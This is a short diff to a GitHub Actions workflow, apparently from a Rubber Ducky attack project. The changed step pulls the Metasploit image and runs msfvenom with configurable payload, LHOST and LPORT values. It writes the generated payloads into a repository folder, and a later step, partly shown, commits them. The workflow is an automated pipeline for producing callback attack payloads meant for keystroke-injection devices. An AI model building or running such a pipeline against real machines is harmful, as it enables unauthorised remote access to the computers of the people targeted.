@@ -28,14 +28,22 @@ jobs:
         run: mkdir -p Rubber_Ducky/payloads
 
       - name: Generate Payload (Docker)
-        uses: docker://metasploitframework/metasploit-framework
-        with:
-          args: >
-            msfvenom -p ${{ steps.config.outputs.PAYLOAD }}
-            LHOST=${{ steps.config.outputs.LHOST }}
-            LPORT=${{ steps.config.outputs.LPORT }}
-            -f ${{ steps.config.outputs.FORMAT }}
-            -o Rubber_Ducky/payloads/payload.${{ steps.config.outputs.FORMAT }}
+        run: |
+          echo "Pulling Metasploit Image..."
+          docker pull metasploitframework/metasploit-framework
+          
+          echo "Running MSFVenom..."
+          docker run --rm \
+            -v "$PWD:/data" \
+            metasploitframework/metasploit-framework \
+            msfvenom -p ${{ steps.config.outputs.PAYLOAD }} \
+            LHOST=${{ steps.config.outputs.LHOST }} \
+            LPORT=${{ steps.config.outputs.LPORT }} \
+            -f ${{ steps.config.outputs.FORMAT }} \
+            -o /data/Rubber_Ducky/payloads/payload.${{ steps.config.outputs.FORMAT }}
+          
+          echo "Fixing permissions..."
+          sudo chown -R $USER:$USER Rubber_Ducky/payloads
 
       - name: Commit and Push
         run: |
